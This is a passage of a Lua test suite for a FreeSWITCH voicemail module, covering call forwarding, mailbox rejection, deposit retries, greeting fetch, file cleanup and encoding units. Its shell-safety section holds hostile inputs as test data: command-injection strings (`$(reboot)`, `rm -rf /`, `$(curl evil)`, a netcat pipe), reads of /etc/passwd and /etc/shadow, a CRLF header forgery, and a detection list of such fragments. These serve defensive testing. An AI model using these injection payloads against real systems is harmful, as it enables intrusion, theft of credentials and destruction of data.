    check("[2] record args end in '200 10'", c.records[1] and c.records[1]:match(" 300 200 10$") ~= nil, c.records[1])
    assert_jitterbuffer("[2] on-net", c, true)
    assert_clean("[2]", c)

    print("[2b] on-net RCF (pass_caller_id=false) -> mailbox: masking DID presented")
    c = run_scenario({
        inbound_did = "+16170000002", caller_id = "+15085550777", sip_from_user = "+15085550777",
        caller_name = "Bob",
        step1 = { product_type = "rcf", customer_id = 10, forward_to = MAILBOX_DID, pass_caller_id = false, rcf_name = "Masked" },
        oracle = { [MAILBOX_DID] = VM_ORACLE_ROW },
    })
    _, meta = meta_of(popen_kind(c, "/fs/deposit")[1] or "")
    check("meta caller_id_number = masking RCF DID", meta and meta.caller_id_number == "+16170000002",
        meta and meta.caller_id_number)
    check("meta caller_id_name empty (mask has no caller name)", meta and meta.caller_id_name == "",
        meta and meta.caller_id_name)
    check("no carrier leg", #c.bridges == 0, #c.bridges)
    assert_clean("[2b]", c)

    print("[2c] RCF -> RCF -> mailbox chain: hops=2, one terminal, no carrier leg")
    c = run_scenario({
        inbound_did = "+16170000003", caller_id = "+15085550888", sip_from_user = "+15085550888",
        step1 = { product_type = "rcf", customer_id = 10, forward_to = "+16170000004", pass_caller_id = true },
        oracle = {
            ["+16170000004"] = { did = "+16170000004", product_type = "rcf", customer_id = "11",
                product_ref_id = "4", product_enabled = "t", customer_status = "active",
                forward_to = MAILBOX_DID, pass_caller_id = "t", ring_timeout = "30", max_channels = "0",
                product_name = "Mid" },
            [MAILBOX_DID] = VM_ORACLE_ROW,
        },
    })
    check("hops=2 on_net=true customer=77 origin=10",
        c.setvars.on_net_hops == "2" and c.setvars.on_net == "true" and c.setvars.customer_id == "77"
        and c.setvars.origin_customer_id == "10",
        tostring(c.setvars.on_net_hops) .. " " .. tostring(c.setvars.customer_id))
    check("no carrier leg, deposited", #c.bridges == 0 and c.setvars.vm_result == "stored", c.setvars.vm_result)
    assert_clean("[2c]", c)
end

-- ==================================================================
-- [3] Disabled / suspended -> 603 (existing hard_reject path)
-- ==================================================================
do
    print("[3] disabled / suspended mailbox -> 603 CALL_REJECTED, never answered")
    local function rejected(tag, c, expect_customer)
        check(tag .. ": hangup CALL_REJECTED only", #c.hangups == 1 and c.hangups[1] == "CALL_REJECTED",
            table.concat(c.hangups, ","))
        check(tag .. ": lua_routed=true", c.setvars.lua_routed == "true", c.setvars.lua_routed)
        check(tag .. ": not answered, nothing recorded, no HTTP", not c.answered and #c.records == 0 and #c.popen == 0,
            tostring(c.answered) .. " " .. #c.records .. " " .. #c.popen)
        check(tag .. ": no carrier leg", #c.bridges == 0, #c.bridges)
        check(tag .. ": customer_id=" .. expect_customer, c.setvars.customer_id == expect_customer, c.setvars.customer_id)
        assert_clean(tag, c)
    end
    local row = copy(VM_ORACLE_ROW); row.product_enabled = "f"
    rejected("[3a] on-net disabled mailbox", run_scenario({
        inbound_did = "+16170000001",
        step1 = { product_type = "rcf", customer_id = 10, forward_to = MAILBOX_DID },
        oracle = { [MAILBOX_DID] = row },
    }), "10")
    row = copy(VM_ORACLE_ROW); row.customer_status = "suspended"
    rejected("[3b] on-net suspended customer", run_scenario({
        inbound_did = "+16170000001",
        step1 = { product_type = "rcf", customer_id = 10, forward_to = MAILBOX_DID },
        oracle = { [MAILBOX_DID] = row },
    }), "10")
    local c = run_scenario(direct({ step1 = { product_type = "voicemail", customer_id = 77, mailbox_id = 42, enabled = false } }))
    rejected("[3c] direct-dial disabled mailbox", c, "77")
    check("[3c] product_type=voicemail on the reject CDR", c.setvars.product_type == "voicemail", c.setvars.product_type)
    rejected("[3d] direct-dial suspended customer", run_scenario(direct({
        step1 = { product_type = "voicemail", customer_id = 77, mailbox_id = 42, customer_status = "suspended" } })), "77")
end

-- ==================================================================
-- [4] Shell safety: hostile caller data only ever inside base64url
-- ==================================================================
do
    print("[4] hostile caller name/number never reaches a command line")
    local hostile = {
        { name = "@/etc/passwd",        number = "+15085550123" },
        { name = "$(reboot)",           number = "+15085550123" },
        { name = "'; rm -rf / #",       number = "+15085550123" },
        { name = "`id`|nc evil 1 \"x\\y", number = "+15085550123" },
        { name = "Eve\r\nX-Ingest-Secret: forged", number = "+15085550123" },
        { name = "Normal", number = "@/etc/shadow" },
        { name = "Normal", number = "$(curl evil)" },
    }
    local bad_fragments = { "passwd", "shadow", "reboot", "rm -rf", "`", "$(", "evil", "forged", "Eve", "Normal" }
    for i, h in ipairs(hostile) do
        local c = run_scenario(direct({ caller_name = h.name, caller_id = h.number, sip_from_user = h.number,
            uuid = "evil'$(reboot)`id`@x" }))
        local all = table.concat(c.popen, "\n") .. "\n" .. table.concat(c.execs, "\n")
        local leaked
        for _, frag in ipairs(bad_fragments) do
            if all:find(frag, 1, true) then leaked = frag end
        end
        check(string.format("[4.%d] no caller/Call-ID data in any command (%s)", i, (h.name:gsub("%c", "?"))), leaked == nil, leaked)
        local dep_cmd = popen_kind(c, "/fs/deposit")[1] or ""
        local b64, meta = meta_of(dep_cmd)
        local rp = rec_path_of(c)
        check(string.format("[4.%d] deposit command exact template", i),
            rp and dep_cmd == expected_deposit_cmd(rp, b64 or "?"), dep_cmd)
        check(string.format("[4.%d] mailbox command exact template", i),
            c.popen[1] == expected_mailbox_cmd(42), c.popen[1])
        local exp_name = dep.clean_text(h.name, 100)
        local exp_num = dep.clean_text(h.number, 40)
        check(string.format("[4.%d] caller data round-trips inside X-VM-Meta", i),
            meta and meta.caller_id_name == exp_name and meta.caller_id_number == exp_num
            and meta.call_uuid == "evil'$(reboot)`id`@x",
            meta and (tostring(meta.caller_id_name) .. " | " .. tostring(meta.caller_id_number)))
        check(string.format("[4.%d] record path is fixed dir + uuid4 only", i),
            rp and rp:match("^/dev/shm/vm/" .. UUID4 .. "%.wav$"), rp)
        assert_clean(string.format("[4.%d]", i), c)
    end
    -- API_HOST is env, but still validated before it can reach a command line
    local c = run_scenario(direct({ env = { API_HOST = "10.1.1.1;reboot" } }))
    check("[4.h] invalid API_HOST -> no command at all", #c.popen == 0, #c.popen)
    check("[4.h] invalid API_HOST -> unavailable prompt + config result",
        c.setvars.vm_result == "unavailable_config"
        and c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/unavailable.wav",
        tostring(c.setvars.vm_result) .. " " .. tostring(c.playbacks[1]))
    assert_clean("[4.h]", c)
end

-- ==================================================================
-- [5] Recording removed on every exit path
-- ==================================================================
do
    print("[5] tmpfs file removed on every exit path")
    -- 5xx then retries exhausted
    local c = run_scenario(direct({ deposits = {
        { code = "500" }, { code = "502" }, { code = "503", body = '{"detail":"busy"}' } } }))
    check("[5a] 3 deposit attempts", #popen_kind(c, "/fs/deposit") == 3, #popen_kind(c, "/fs/deposit"))
    check("[5a] backoff 1 s then 2 s (msleep)", #c.msleeps == 2 and c.msleeps[1] == 1000 and c.msleeps[2] == 2000,
        table.concat(c.msleeps, ","))
    check("[5a] result lost + ERROR 'message lost'", c.setvars.vm_result == "lost" and has_log(c, "ERR", "message lost"),
        c.setvars.vm_result)
    check("[5a] identical command on every retry (idempotent msg_uuid)",
        popen_kind(c, "/fs/deposit")[1] == popen_kind(c, "/fs/deposit")[3], "differs")
    assert_clean("[5a]", c)

    c = run_scenario(direct({ deposits = { { code = "000", exit = 28 }, { code = "200", body = '{"status":"stored","message_id":5}' } } }))
    check("[5b] timeout then 200: stored on attempt 2", c.setvars.vm_result == "stored"
        and c.setvars.vm_deposit_attempts == "2" and #c.msleeps == 1 and c.msleeps[1] == 1000,
        tostring(c.setvars.vm_result) .. " " .. tostring(c.setvars.vm_deposit_attempts))
    assert_clean("[5b]", c)

    c = run_scenario(direct({ deposits = { { code = "401", body = '{"detail":"bad secret"}' } } }))
    check("[5c] 401: one attempt, no retry, rejected_401, ERROR",
        #popen_kind(c, "/fs/deposit") == 1 and #c.msleeps == 0 and c.setvars.vm_result == "rejected_401"
        and has_log(c, "ERR", "not retried"), c.setvars.vm_result)
    assert_clean("[5c]", c)

    c = run_scenario(direct({ record = { secs = 20, hangup = true } }))
    check("[5d] hangup mid-record: deposit still runs", #popen_kind(c, "/fs/deposit") == 1, #popen_kind(c, "/fs/deposit"))
    check("[5d] deposit ran after the caller hung up", find_event(c, "popen:deposit:down") ~= nil, table.concat(c.events, ","))
    check("[5d] the file existed when curl read it", c.deposit_file_present and c.deposit_file_present[1], "missing")
    check("[5d] duration from the WAV = 20000", ({ meta_of(popen_kind(c, "/fs/deposit")[1] or "") })[2].duration_ms == 20000, "dur")
    check("[5d] stored", c.setvars.vm_result == "stored", c.setvars.vm_result)
    assert_clean("[5d]", c)

    c = run_scenario(direct({ record = { secs = 9, raise = true } }))
    check("[5e] Lua error during record: result error, no deposit",
        c.setvars.vm_result == "error" and #popen_kind(c, "/fs/deposit") == 0, c.setvars.vm_result)
    check("[5e] flow error logged", has_log(c, "ERR", "voicemail flow error"), "no log")
    assert_clean("[5e]", c)

    c = run_scenario(direct({ raise_on_rec_open = 3 }))
    check("[5f] Lua error in the deposit phase: result lost, logged",
        c.setvars.vm_result == "lost" and has_log(c, "ERR", "deposit phase error"), c.setvars.vm_result)
    assert_clean("[5f]", c)

    c = run_scenario(direct({ raise_on_rec_open = 2 }))
    check("[5f2] Lua error AFTER the recording completed: flow error logged, message still deposited",
        has_log(c, "ERR", "voicemail flow error") and c.setvars.vm_result == "stored"
        and #popen_kind(c, "/fs/deposit") == 1, c.setvars.vm_result)
    assert_clean("[5f2]", c)

    c = run_scenario(direct({ deposits = { "raise", "raise", "raise" } }))
    check("[5g] popen itself raising: treated as transient, 3 attempts, lost",
        c.setvars.vm_result == "lost" and #popen_kind(c, "/fs/deposit") == 3, c.setvars.vm_result)
    assert_clean("[5g]", c)

    c = run_scenario(direct({ record = { secs = 0.6, hangup = true } }))
    check("[5h] < 1 s recording (caller hung up): not deposited, too_short, no prompt",
        c.setvars.vm_result == "too_short" and #popen_kind(c, "/fs/deposit") == 0
        and c.playbacks[#c.playbacks] == "tone_stream://%(500,0,1000)", c.setvars.vm_result)
    assert_clean("[5h]", c)

    c = run_scenario(direct({ record = { secs = 0 } }))
    check("[5h2] record returns at once with the caller connected (tmpfs full / instant '#'): unavailable, no deposit",
        c.setvars.vm_result == "too_short" and #popen_kind(c, "/fs/deposit") == 0
        and c.playbacks[#c.playbacks] == "/usr/local/freeswitch/scripts/sounds/vm/unavailable.wav"
        and has_log(c, "WARNING", "tmpfs full"), tostring(c.setvars.vm_result) .. " " .. tostring(c.playbacks[#c.playbacks]))
    assert_clean("[5h2]", c)

    c = run_scenario(direct({ record = { nofile = true } }))
    check("[5i] record produced no file (tmpfs full): record_failed + unavailable, no deposit",
        c.setvars.vm_result == "record_failed" and #popen_kind(c, "/fs/deposit") == 0
        and c.playbacks[#c.playbacks] == "/usr/local/freeswitch/scripts/sounds/vm/unavailable.wav",
        tostring(c.setvars.vm_result) .. " " .. tostring(c.playbacks[#c.playbacks]))
    assert_clean("[5i]", c)

    c = run_scenario(direct({ hangup_during_greeting = true }))
    check("[5j] hangup during greeting: no record, no deposit, caller_gone",
        #c.records == 0 and #popen_kind(c, "/fs/deposit") == 0 and c.setvars.vm_result == "caller_gone",
        c.setvars.vm_result)
    assert_clean("[5j]", c)
end

-- ==================================================================
-- [6] Custom greeting: fetched to tmpfs, played, unlinked immediately
-- ==================================================================
do
    print("[6] custom greeting")
    local mb = { code = "200", body = '{"mailbox_id":42,"accepting":true,"reason":null,"max_message_seconds":300,"greeting":{"greeting_id":5,"duration_ms":2000}}' }
    local c = run_scenario(direct({ mailbox = mb, greeting = { code = "200", content = wav_bytes(2, 16000) } }))
    local gcmd = popen_kind(c, "/fs/greetings/")[1] or ""
    local gpath = gcmd:match(" %-o '([^']+)'")
    check("[6a] greeting path = /dev/shm/vm/g_<uuid4>.wav", gpath and gpath:match("^/dev/shm/vm/g_" .. UUID4 .. "%.wav$"), gpath)
    check("[6a] greeting GET command exact", gpath and gcmd == expected_greeting_cmd(5, gpath), gcmd)
    check("[6a] greeting played from tmpfs", c.playbacks[1] == gpath, c.playbacks[1])
    check("[6a] greeting unlinked BEFORE record started (dir empty at record)",
        c.vm_dir_at_record and #c.vm_dir_at_record == 0, c.vm_dir_at_record and table.concat(c.vm_dir_at_record, ","))
    local pi, ri = find_event(c, "playback:" .. (gpath or "?")), find_event(c, "remove:" .. (gpath or "?"))
    check("[6a] unlink right after its playback", pi and ri and ri == pi + 1, tostring(pi) .. "/" .. tostring(ri))
    check("[6a] vm_greeting=custom", c.setvars.vm_greeting == "custom", c.setvars.vm_greeting)
    check("[6a] record uses 300 s", c.records[1] and c.records[1]:match(" 300 200 10$"), c.records[1])
    assert_clean("[6a]", c)

    c = run_scenario(direct({ mailbox = mb, greeting = { code = "200", content = "<html>not a wav</html>" } }))
    check("[6b] non-WAV greeting body: default prompt instead",
        c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/default_greeting.wav" and c.setvars.vm_greeting == "default",
        c.playbacks[1])
    assert_clean("[6b]", c)

    c = run_scenario(direct({ mailbox = mb, greeting = { code = "503" } }))
    check("[6c] greeting fetch 503: default prompt, still deposits",
        c.setvars.vm_greeting == "default" and c.setvars.vm_result == "stored", c.setvars.vm_greeting)
    assert_clean("[6c]", c)

    c = run_scenario(direct({ mailbox = mb, greeting = { code = "200", content = wav_bytes(2), exit = 63 } }))
    check("[6d] curl exit != 0 with a 200 (partial download): default prompt",
        c.setvars.vm_greeting == "default", c.setvars.vm_greeting)
    assert_clean("[6d]", c)
end

-- ==================================================================
-- [7] Prompts missing -> tone fallback (never fails the call)
-- ==================================================================
do
    print("[7] prompt files missing -> tones")
    local c = run_scenario(direct({ sounds = "missing" }))
    check("[7a] greeting tone instead of default_greeting.wav",
        c.playbacks[1] == "tone_stream://%(200,80,500);%(200,80,650);%(200,0,800)", c.playbacks[1])
    check("[7a] still records + deposits", c.setvars.vm_result == "stored" and c.setvars.vm_greeting == "tone", c.setvars.vm_result)
    check("[7a] missing prompt logged WARNING", has_log(c, "WARNING", "missing"), "no log")
    assert_clean("[7a]", c)

    c = run_scenario(direct({ sounds = "missing",
        mailbox = { code = "200", body = '{"mailbox_id":42,"accepting":false,"reason":"full"}' } }))
    check("[7b] mailbox full + prompt missing -> reorder tone, hangup, no record",
        c.playbacks[1] == "tone_stream://L=6;%(250,250,480,620)" and #c.records == 0
        and c.setvars.vm_result == "not_accepting_full", tostring(c.playbacks[1]))
    assert_clean("[7b]", c)
end

-- ==================================================================
-- [8] Mailbox lookup outcomes
-- ==================================================================
do
    print("[8] mailbox lookup outcomes")
    local c = run_scenario(direct({ mailbox = { code = "200", body = '{"mailbox_id":42,"accepting":false,"reason":"full"}' } }))
    check("[8a] full -> mailbox_full.wav, no record, no deposit",
        c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/mailbox_full.wav" and #c.records == 0
        and #popen_kind(c, "/fs/deposit") == 0, c.playbacks[1])
    check("[8a] answered then hung up NORMAL_CLEARING", c.answered and c.hangups[1] == "NORMAL_CLEARING", c.hangups[1])
    assert_clean("[8a]", c)

    c = run_scenario(direct({ mailbox = { code = "200", body = '{"mailbox_id":42,"accepting":false,"reason":"inactive"}' } }))
    check("[8b] inactive -> unavailable.wav", c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/unavailable.wav"
        and c.setvars.vm_result == "not_accepting_inactive", c.playbacks[1])
    assert_clean("[8b]", c)

    for _, code in ipairs({ "404", "401", "403" }) do
        c = run_scenario(direct({ mailbox = { code = code, body = '{"detail":"x"}' } }))
        check("[8c] lookup " .. code .. " -> unavailable, no record/deposit",
            c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/unavailable.wav" and #c.records == 0
            and #popen_kind(c, "/fs/deposit") == 0 and c.setvars.vm_result == "unavailable_" .. code,
            tostring(c.setvars.vm_result))
        assert_clean("[8c " .. code .. "]", c)
    end

    local failures_list = {
        { tag = "timeout (000, curl 28)", m = { code = "000", exit = 28 } },
        { tag = "500", m = { code = "500", body = "oops" } },
        { tag = "200 garbage JSON", m = { code = "200", body = "<html>" } },
        { tag = "200 without accepting", m = { code = "200", body = '{"mailbox_id":42}' } },
        { tag = "popen raises", m = "raise" },
    }
    for _, f in ipairs(failures_list) do
        c = run_scenario(direct({ mailbox = f.m }))
        local rp = rec_path_of(c)
        check("[8d] lookup " .. f.tag .. " -> defaults: 300 s, default greeting, deposits",
            rp and c.records[1] == rp .. " 300 200 10"
            and c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/default_greeting.wav"
            and c.setvars.vm_result == "stored", tostring(c.records[1]) .. " " .. tostring(c.setvars.vm_result))
        assert_clean("[8d " .. f.tag .. "]", c)
    end

    c = run_scenario(direct({ mailbox = { code = "200", body = '{"mailbox_id":42,"accepting":true,"max_message_seconds":99999}' } }))
    check("[8e] out-of-range max_message_seconds -> 300", c.records[1] and c.records[1]:match(" 300 200 10$"), c.records[1])
    assert_clean("[8e]", c)
end

-- ==================================================================
-- [9] Preflight / configuration failures (fail closed, call never crashes)
-- ==================================================================
do
    print("[9] configuration failures")
    local cases = {
        { tag = "header file missing", sc = { header = false } },
        { tag = "header malformed", sc = { header = "Authorization: x\n" } },
        { tag = "secret too short", sc = { header = "X-Ingest-Secret: short\n" } },
        { tag = "two header lines", sc = { header = GOOD_SECRET_LINE .. "X-Other: y\n" } },
        { tag = "tmpfs not mounted", sc = { mounts = MOUNTS_NO_VM } },
        { tag = "API_HOST unset", sc = { env = { API_HOST = false } } },
        { tag = "API_PORT bad", sc = { env = { API_PORT = "80;id" } } },
    }
    for _, k in ipairs(cases) do
        local c = run_scenario(direct(k.sc))
        check("[9] " .. k.tag .. ": unavailable prompt, no HTTP, no record",
            c.setvars.vm_result == "unavailable_config" and #c.popen == 0 and #c.records == 0
            and c.playbacks[1] == "/usr/local/freeswitch/scripts/sounds/vm/unavailable.wav",
            tostring(c.setvars.vm_result) .. " popen=" .. #c.popen)
        check("[9] " .. k.tag .. ": ERROR logged", has_log(c, "ERR", "voicemail unavailable"), "no log")
        assert_jitterbuffer("[9 " .. k.tag .. "]", c, false)
        assert_clean("[9 " .. k.tag .. "]", c)
    end
    local c = run_scenario(direct({ header = "X-Ingest-Secret: " .. string.rep("q", 40) .. "\r\n" }))
    check("[9] CRLF header file accepted", c.setvars.vm_result == "stored", c.setvars.vm_result)

    c = run_scenario(direct({ vm_box_missing = true }))
    check("[9] vm_box.lua unloadable -> 503 hard reject, lua_routed, not answered",
        c.hangups[1] == "NORMAL_TEMPORARY_FAILURE" and c.setvars.lua_routed == "true" and not c.answered,
        tostring(c.hangups[1]))
end

-- ==================================================================
-- [10] Unrelated DIDs: 404 unchanged; RCF/trunk never touch voicemail
-- ==================================================================
do
    print("[10] non-voicemail calls")
    local c = run_scenario({ inbound_did = "+15559990000" })
    check("[10a] unknown DID -> UNALLOCATED_NUMBER (voicemail lookup was last)",
        c.hangups[1] == "UNALLOCATED_NUMBER" and c.db_calls[4] == "voicemail:+15559990000", table.concat(c.db_calls, ","))
    check("[10a] no voicemail activity", #c.popen == 0 and not c.answered, #c.popen)
    c = run_scenario({ inbound_did = "+16170000001",
        step1 = { product_type = "rcf", customer_id = 10, forward_to = "+17745550100" } })
    check("[10b] off-net RCF still bridges to the carrier, no voicemail lookup/HTTP",
        #c.bridges >= 1 and #c.popen == 0 and count(c.db_calls, function(x) return x:match("^voicemail") end) == 0,
        #c.bridges)
    check("[10b] off-net RCF: no jitter buffer / RTP timer (voicemail leg only)",
        c.setvars.jitterbuffer_msec == nil and c.setvars.rtp_timer_name == nil
        and not (table.concat(c.bridges, "\n"):find("jitterbuffer", 1, true))
        and not (table.concat(c.bridges, "\n"):find("rtp_timer_name", 1, true)),
        tostring(c.setvars.jitterbuffer_msec) .. " / " .. tostring(c.setvars.rtp_timer_name))
end

-- ==================================================================
-- [11] Sweep: constant command, rate-limited
-- ==================================================================
do
    print("[11] opportunistic sweep")
    local c = run_scenario(direct({ sweep_last = os.time() - 10 }))
    check("[11a] sweep skipped inside the 5-minute window", #c.execs == 0, table.concat(c.execs, " | "))
    c = run_scenario(direct({ sweep_last = os.time() - 301 }))
    check("[11b] sweep runs after the window", c.execs[1] == SWEEP_CMD, c.execs[1])
    check("[11c] startup sweep command (1 min)", dep.sweep_cmd(1)
        == "find /dev/shm/vm -mindepth 1 -maxdepth 1 -type f -mmin +1 -delete >/dev/null 2>&1", dep.sweep_cmd(1))
    check("[11d] sweep_cmd refuses non-integers", dep.sweep_cmd("1; reboot") == nil and dep.sweep_cmd(1.5) == nil, "accepted")
end

-- ==================================================================
-- [12] Retry table (vm_deposit.classify / deposit) — contract §5
-- ==================================================================
do
    print("[12] contract §5 retry table")
    local function run_deposit(responses)
        local env = setmetatable({ freeswitch = { consoleLog = function() end } }, { __index = _G })
        local n = 0
        local cmds = {}
        env.io = setmetatable({
            popen = function(cmd)
                n = n + 1
                cmds[#cmds + 1] = cmd
                local r = responses[n] or responses[#responses]
                return {
                    read = function() return (r.body or "") .. "\n" .. r.code end,
                    close = function() return true, "exit", 0 end,
                }
            end,
        }, { __index = io })
        env.loadfile = function(p) return loadfile(p, "t", env) end
        local d = assert(loadfile(LIBDIR .. "vm_deposit.lua", "t", env))()
        local sleeps = {}
        local res = d.deposit("http://10.0.0.5:8000",
            "/dev/shm/vm/0f8fad5b-d9cb-469f-a165-70867728950e.wav", "eyJ2IjoxfQ",
            function(ms) sleeps[#sleeps + 1] = ms end, function() return true end)
        return res, sleeps, cmds
    end
    for _, code in ipairs({ "400", "401", "404", "409", "413", "415", "422", "403", "301" }) do
        local res, sleeps = run_deposit({ { code = code } })
        check("[12] " .. code .. " -> 1 attempt, no retry, rejected",
            res.outcome == "rejected" and res.attempts == 1 and #sleeps == 0, res.outcome .. "/" .. res.attempts)
    end
    for _, code in ipairs({ "500", "502", "503", "504", "000", "408", "429" }) do
        local res, sleeps = run_deposit({ { code = code } })
        check("[12] " .. code .. " -> 3 attempts, backoff 1s/2s, lost",
            res.outcome == "lost" and res.attempts == 3 and sleeps[1] == 1000 and sleeps[2] == 2000 and #sleeps == 2,
            res.outcome .. "/" .. res.attempts)
    end
    local res = run_deposit({ { code = "200", body = '{"status":"error"}' }, { code = "200", body = '{"status": "stored", "message_id": 77}' } })
    check("[12] 200 without status=stored is NOT success (defect 8) -> retried",
        res.outcome == "stored" and res.attempts == 2 and res.message_id == 77, res.outcome .. "/" .. res.attempts)
    res = run_deposit({ { code = "200", body = '{"status":"stored","message_id":1}' } })
    check("[12] 200 stored -> 1 attempt", res.outcome == "stored" and res.attempts == 1, res.outcome)
    local d = dep
    check("[12] deposit_cmd refuses a non-uuid path",
        d.deposit_cmd("http://h:1", "/dev/shm/vm/../../etc/passwd.wav", "abc") == nil
        and d.deposit_cmd("http://h:1", "/tmp/x.wav", "abc") == nil, "accepted")
    check("[12] deposit_cmd refuses a non-base64url meta",
        d.deposit_cmd("http://h:1", "/dev/shm/vm/0f8fad5b-d9cb-469f-a165-70867728950e.wav", "ab+c") == nil
        and d.deposit_cmd("http://h:1", "/dev/shm/vm/0f8fad5b-d9cb-469f-a165-70867728950e.wav", "a'b") == nil, "accepted")
    check("[12] mailbox_cmd refuses non-integer ids",
        d.mailbox_cmd("http://h:1", "42; reboot") == nil and d.mailbox_cmd("http://h:1", 0) == nil
        and d.mailbox_cmd("http://h:1", 4.5) == nil, "accepted")
end

-- ==================================================================
-- [13] Units: json, base64url, uuid4, WAV duration, truncation
-- ==================================================================
do
    print("[13] units")
    local enc = json.encode
    check("[13] json escapes quote/backslash/controls/DEL",
        enc("a\"b\\c\n\r\t\b\f\1\31\127") == '"a\\"b\\\\c\\n\\r\\t\\b\\f\\u0001\\u001f\\u007f"',
        enc("a\"b\\c\n\r\t\b\f\1\31\127"))
    check("[13] json passes valid UTF-8 through", enc("Zoë 日本 😀") == '"Zoë 日本 😀"', enc("Zoë 日本 😀"))
    check("[13] json replaces invalid UTF-8 with U+FFFD", enc("caf\233") == '"caf\239\191\189"', enc("caf\233"))
    check("[13] json rejects overlong / surrogate encodings",
        enc("\192\175") == '"\239\191\189\239\191\189"' and enc("\237\160\128") == '"\239\191\189\239\191\189\239\191\189"',
        enc("\192\175"))
    check("[13] json object keys sorted, ints without .0",
        enc({ b = 1, a = 2.5, c = true, d = { 1, 2 } }) == '{"a":2.5,"b":1,"c":true,"d":[1,2]}',
        enc({ b = 1, a = 2.5, c = true, d = { 1, 2 } }))
    check("[13] json NaN is an error", enc(0 / 0) == nil, enc(0 / 0))
    local t = json.decode('{"a":[1,2,{"b":null}],"s":"x\\u00e9\\ud83d\\ude00\\n","t":true,"f":false,"n":-1.5e2}')
    check("[13] json decode", t and t.a[2] == 2 and t.s == "x\195\169\240\159\152\128\n" and t.t == true
        and t.f == false and t.n == -150 and t.a[3].b == nil, t and t.s)
    check("[13] json decode rejects trailing garbage / bad input",
        json.decode('{"a":1} x') == nil and json.decode("{'a':1}") == nil and json.decode("[1,]") == nil
        and json.decode("01") == nil and json.decode('"a\1"') == nil, "accepted")
    check("[13] json decode depth cap", json.decode(string.rep("[", 200) .. string.rep("]", 200)) == nil, "accepted")
    local name = "Zoë \"x\" \\ @/etc/passwd $(reboot) '; rm -rf /"
    local rt = json.decode(enc({ n = name }))
    check("[13] json round trip of hostile text", rt and rt.n == name, rt and rt.n)

    local vec = { [""] = "", f = "Zg", fo = "Zm8", foo = "Zm9v", foob = "Zm9vYg", fooba = "Zm9vYmE", foobar = "Zm9vYmFy" }
    local okv = true
    for k, v in pairs(vec) do if dep.b64url(k) ~= v or dep.b64url_decode(v) ~= k then okv = false end end
    check("[13] base64url RFC 4648 vectors (no padding)", okv, "mismatch")
    check("[13] base64url uses -_ not +/", dep.b64url("\251\255\191") == "-_-_", dep.b64url("\251\255\191"))
    local allbytes = {}
    for i = 0, 255 do allbytes[#allbytes + 1] = string.char(i) end
    allbytes = table.concat(allbytes)
    check("[13] base64url round trip of all 256 bytes",
        dep.b64url_decode(dep.b64url(allbytes)) == allbytes and dep.b64url(allbytes):match("^[A-Za-z0-9_-]+$"), "mismatch")

    local seen, okfmt = {}, true
    for _ = 1, 200 do
        local u = dep.uuid4()
        if not (u and u:match("^" .. UUID4 .. "$")) or seen[u] then okfmt = false end
        seen[u or ""] = true
    end
    check("[13] uuid4: 200 unique, canonical v4/variant", okfmt, "bad uuid")

    local vbox_env = setmetatable({ freeswitch = { consoleLog = function() end } }, { __index = _G })
    vbox_env.loadfile = function(p)
        local n = p:match("/lib/([%w_]+)%.lua$")
        return loadfile(LIBDIR .. n .. ".lua", "t", vbox_env)
    end
    local vbox = assert(loadfile(LIBDIR .. "vm_box.lua", "t", vbox_env))()
    local wdir = SCRATCH .. "/wav"
    real_os.execute("mkdir -p '" .. wdir .. "'")
    write_file(wdir .. "/a.wav", wav_bytes(3.25))
    write_file(wdir .. "/b.wav", wav_bytes(2, 16000))
    local unfinal = wav_bytes(4):gsub("data....", "data\0\0\0\0", 1)
    write_file(wdir .. "/c.wav", unfinal)
    write_file(wdir .. "/d.wav", "not a wav at all")
    check("[13] wav_duration_ms 8k", vbox.wav_duration_ms(wdir .. "/a.wav") == 3250, vbox.wav_duration_ms(wdir .. "/a.wav"))
    check("[13] wav_duration_ms 16k", vbox.wav_duration_ms(wdir .. "/b.wav") == 2000, vbox.wav_duration_ms(wdir .. "/b.wav"))
    check("[13] wav_duration_ms unfinalized header -> file size", vbox.wav_duration_ms(wdir .. "/c.wav") == 4000,
        vbox.wav_duration_ms(wdir .. "/c.wav"))
    check("[13] wav_duration_ms non-WAV -> nil", vbox.wav_duration_ms(wdir .. "/d.wav") == nil, "parsed")
    -- owner decision O5: threshold 200, 10 s of continuous silence ends the message
    check("[13] silence stop = threshold 200, 10 s",
        vbox.SILENCE_THRESHOLD == 200 and vbox.SILENCE_HITS == 10,
        tostring(vbox.SILENCE_THRESHOLD) .. "/" .. tostring(vbox.SILENCE_HITS))
    -- owner decision O6. The spec must be one FS check_jb() parses as
    -- intended (switch_core_media.c:2386-2437 at FREESWITCH_REF 0a54a48):
    -- "<min>:<max>" in ms with no 'p' (packet) suffix, 10 <= min <= 10000
    -- (otherwise FS falls back to 1 frame), and max >= min (otherwise FS
    -- uses 5 x min). At 20 ms ptime that is 3 to 10 frames.
    check("[13] RTP timer = soft", vbox.RTP_TIMER_NAME == "soft", vbox.RTP_TIMER_NAME)
    local jmin, jmax = tostring(vbox.JITTERBUFFER):match("^(%d+):(%d+)$")
    jmin, jmax = tonumber(jmin), tonumber(jmax)
    check("[13] jitterbuffer_msec = 60:200 (3..10 frames of 20 ms)",
        vbox.JITTERBUFFER == "60:200" and jmin and jmax and jmin >= 10 and jmin <= 10000 and jmax >= jmin
        and math.floor(jmin / 20) == 3 and math.floor(jmax / 20) == 10,
        tostring(vbox.JITTERBUFFER))

    local long = string.rep("é", 150)
    local tr = dep.clean_text(long, 100)
    check("[13] utf8 truncation by code points (100 chars, 200 bytes)", #tr == 200 and json.encode(tr):find("\239\191\189", 1, true) == nil, #tr)
    check("[13] clean_text strips controls", dep.clean_text("  a\r\nb\tc\0d  ", 40) == "a b c d", dep.clean_text("  a\r\nb\tc\0d  ", 40))
    local c = run_scenario(direct({ uuid = string.rep("x", 90) .. "@carrier.example" }))
    local _, meta = meta_of(popen_kind(c, "/fs/deposit")[1] or "")
    check("[13] call_uuid truncated to 64 chars (DB column)", meta and #meta.call_uuid == 64, meta and #meta.call_uuid)

    -- prompts shipped in the repo are 8 kHz mono PCM16 WAV
    for _, p in ipairs({ "default_greeting", "mailbox_full", "unavailable" }) do
        local f = real_io.open(SOUNDS .. p .. ".wav", "rb")
        local h = f and f:read(44) or ""
        if f then f:close() end
